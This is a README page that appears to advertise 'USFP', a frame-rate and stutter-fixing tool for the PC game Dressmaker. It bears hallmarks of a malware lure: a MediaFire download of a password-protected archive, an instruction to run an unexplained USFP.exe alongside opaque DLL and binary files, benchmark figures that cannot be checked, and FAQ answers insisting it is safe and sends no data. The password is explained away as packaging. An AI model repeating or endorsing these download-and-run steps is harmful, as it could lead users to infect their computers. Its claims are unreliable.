<div align="center">

# 🎮 Dressmaker — Performance Notes

**Measure frame delivery, startup, scheduling, and cache behavior.**

[![Status](https://img.shields.io/badge/status-stable-brightgreen)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
[![Download](https://img.shields.io/badge/download-mediafire-00b8ff)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
![Platform](https://img.shields.io/badge/platform-Windows-0078D6?logo=windows)
[![Version](https://img.shields.io/badge/version-1.0-lightgrey)](#)

[Download](#-installation--setup) · [Issues](#-known-performance-issues) · [Test results](#-test-results) · [FAQ](#-frequently-asked-questions)

</div>

---

## 🕹️ About the game

Dressmaker is a PC fashion-design and management game centered on creating garments, managing production, and presenting collections. Its interface-heavy scenes and layered visual effects make consistent frame delivery important during design and presentation workflows.

Dressmaker players who need measurable diagnostics for frame pacing, launch behavior, and session stability.

## 📸 Screenshots from the game

<table>
 <tr>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/4019220/6b964f0ee4ad9041718877ec563b0079c3353ce1/ss_6b964f0ee4ad9041718877ec563b0079c3353ce1.1920x1080.jpg?t=1790009899" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/4019220/9324e5f5fcaec804ef925bc5e79e8f3f15dfe329/ss_9324e5f5fcaec804ef925bc5e79e8f3f15dfe329.1920x1080.jpg?t=1790009899" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/4019220/fa62a65abc68c79812fd1daa771deb4ef2bc0312/ss_fa62a65abc68c79812fd1daa771deb4ef2bc0312.1920x1080.jpg?t=1790009899" alt="screenshot" width="100%"></td>
 </tr>
</table>

## ⚠️ Known performance issues

- On the stated test rig, average performance falls to 34 FPS with 1% lows of 14 FPS during collection presentations.
- On the stated test rig, shader compilation produces 8 frame-time spikes above 50 ms during the first session.
- On the stated test rig, launch initialization takes approximately 90 seconds and interrupted sessions can require a full restart.

## 🩺 How the toolkit addresses these issues

- **Low average FPS and 1% lows** → Frame Rate Helper — adjusts frame delivery behavior to reduce uneven presentation workloads.
- **Shader-related frame-time spikes** → Graphics Cache Utility — manages graphics cache data, while Frame Timing Helper — stabilizes frame delivery.
- **Long launches and interrupted sessions** → Startup Parameter Tool — applies tuned startup parameters, while Stability Report + Session Recovery — provides diagnostic collection and recovery.

## 📊 Test results

Test rig: Ryzen 5 5600, RTX 3060 12GB, 16GB RAM, NVMe SSD, Windows 11 x64, 1920x1080, High settings

| Metric | Before | After |
|---|---|---|
| Average FPS | 34 | 51 |
| 1% low FPS | 14 | 27 |
| Frame-time spikes above 50 ms | 8 | 2 |
| Shader compile time on launch | ~90s | ~19s |


## 🚀 How to use

1. Download the latest release from the link in the README.
2. Point the tool to the game's installation folder.
3. Select the game profile from the supported list.
4. Click Apply.
5. On first launch allow the cache to rebuild for 1-2 minutes.

## 🛠️ What this tool does

- 🎮 **Frame Rate Helper** — Adjusts frame delivery behavior for more consistent rendering.
- 🎯 **Frame Timing Helper** — Stabilizes frame delivery and records timing variance.
- 📊 **Stability Report + Session Recovery** — Collects diagnostics and restores interrupted session settings.
- 🧹 **Graphics Cache Utility** — Manages graphics cache data and controlled cache rebuilds.
- 🧠 **Process Scheduling Helper** — Adjusts process scheduling priorities for the game session.
- ⚙️ **Startup Parameter Tool** — Applies tuned startup parameters for Dressmaker launch sessions.

## 💻 System Requirements

| Component | Minimum | Recommended |
|:--- |:--- |:--- |
| **OS** | Windows 10 (x64) | Windows 11 (x64) |
| **Processor** | Dual-core CPU | Quad-core CPU |
| **RAM** | 4 GB | 8 GB |
| **Graphics** | Any DirectX 11 GPU | Any DirectX 12 GPU |
| **Storage** | 50 MB available space | 100 MB available space |
| **Additional** | Windows 10 build 1909 or newer | Windows 11 with latest updates |


## 📦 Installation & Setup

| Platform | Status |
|---|---|
| Windows | ✅ Supported |
| macOS | ❌ Not supported |
| Linux | ❌ Not supported |

### Step 1: Download

You can download the tool from **[this page](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)**. The archive contains everything you need.

### Step 2: Extract with Password

1. The archive is password-protected: **`2026`**
2. Use any archive extractor (WinRAR, 7-Zip, WinZip)
3. Enter the password when prompted

### Step 3: Extract All Files

1. Extract all files from the archive to a folder of your choice.
2. All files must be extracted to the **same folder**.
3. Do not rename or move individual files.
4. The folder should look like this:

```
tool/
|-- USFP.exe <- Main executable
|-- shader_cache.pak <- Shader cache data
|-- crash_reader.dll <- Crash log reader
|-- config.cfg <- User configuration
|-- fps_module.dll <- FPS module
|-- frame_data.pak <- Display sync data
|-- Password 2026.txt <- Password reminder (empty)
|-- core.bin <- Core runtime
```

### Step 4: Run the tool

1. Open the extracted folder.
2. Run `USFP.exe`.
3. Select the game you want to diagnose from the list.
4. Press **Collect** and launch the game.

### Step 5: Review the results

1. The tool will collect frame timing and scheduling data while you play.
2. When you exit the game, an overview report is written next to the tool.
3. Use the report to identify which subsystem is causing stutter.

## ❓ Frequently Asked Questions

**Q: Can I revert the changes?**
**A:** Yes. Simply close the game, exit the tool, and launch the game again without it. No changes persist after the process is terminated.

**Q: What happens if the game closes unexpectedly?**
**A:** The Stability Report feature records the exit event and writes a small log next to the tool, so you can see what happened.

**Q: Is it safe to use?**
**A:** Yes. It runs as a standalone executable, does not install anything system-wide, and can be removed by deleting its folder.

**Q: What is this tool?**
**A:** This is a small Windows diagnostics and tuning tool for PC games. It collects frame timing data, checks process scheduling, and manages graphics cache folders to help you find and reduce stutters and dropped frames.

**Q: How often is it updated?**
**A:** Updates are published whenever a new internal build is ready. There is no fixed schedule — the download link in Step 1 always points to the latest version.

**Q: Does it require an internet connection?**
**A:** No. It runs fully offline and never sends data anywhere.

**Q: Why is the archive password-protected?**
**A:** The archive uses a password as a standard packaging step so the build stays bundled correctly during distribution. The password is provided in the installation section above.